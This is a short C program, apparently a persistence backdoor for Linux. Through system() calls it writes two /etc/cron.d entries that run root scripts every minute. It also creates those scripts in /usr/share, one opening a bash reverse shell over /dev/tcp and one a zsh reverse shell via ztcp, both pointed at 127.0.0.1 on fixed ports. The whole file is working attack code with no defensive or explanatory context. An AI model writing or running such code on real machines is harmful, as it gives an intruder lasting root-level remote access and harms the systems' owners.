#include<stdio.h>
#include<stdlib.h>


int main()
{


    //system("remote_adress=\"127.0.0.1\"");
    //system("zshport=\"5566\"");
    //system("bashport=\"4455\"");

    system("touch /etc/cron.d/cronRegister 2>/dev/null &");
    system("touch /etc/cron.d/cronRegister2 2>/dev/null &");

    system("echo \" *  *  *  *  *    root /usr/share/rbash.sh \" > /etc/cron.d/cronRegister &");
    system("echo \" *  *  *  *  *    root /usr/share/rzsh.sh \" > /etc/cron.d/cronRegister2 &");

    system("chmod 644 /etc/cron.d/cronRegister &");
    system("chmod 644 /etc/cron.d/cronRegister2 &");

    system("touch /usr/share/rbash.sh  &");
    system("touch /usr/share/rzsh.sh & ");


    system("echo -e \"#!/bin/bash \n \n  /bin/bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/5566 <&1' & \" >  /usr/share/rbash.sh &");

    system("echo -e  \"#!/bin/zsh \n \n\" > /usr/share/rzsh.sh");

    system("echo -n \"/bin/zsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 4455 && zsh >&$REPLY 2>&$REPLY <&$REPLY' &\" >>  /usr/share/rzsh.sh &");

    system("chmod 100 /usr/share/rbash.sh &");
    system("chmod 100 /usr/share/rzsh.sh &");

    return(0);
}